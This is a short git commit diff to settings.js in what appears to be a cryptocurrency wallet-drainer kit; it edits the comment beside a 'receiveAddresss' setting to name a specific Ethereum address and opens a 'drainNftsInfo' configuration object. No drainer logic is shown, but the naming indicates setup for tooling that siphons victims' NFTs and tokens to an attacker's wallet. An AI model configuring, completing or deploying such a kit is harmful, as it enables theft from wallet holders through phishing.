93858e54005486c24cd554f47b7c272a731ecff5
Husszn99 <130696562+Husszn99@users.noreply.github.com>
2023-05-01 14:29:00 +0500

    Update settings.js
    Good

--- settings.js
+++ settings.js
@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "wallet"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "wallet"; // YOUR WALLET ADDRESS "0x370c794A7B32D8fDD10936338249b2bfd2e22A1c"
 
 
 const drainNftsInfo = {
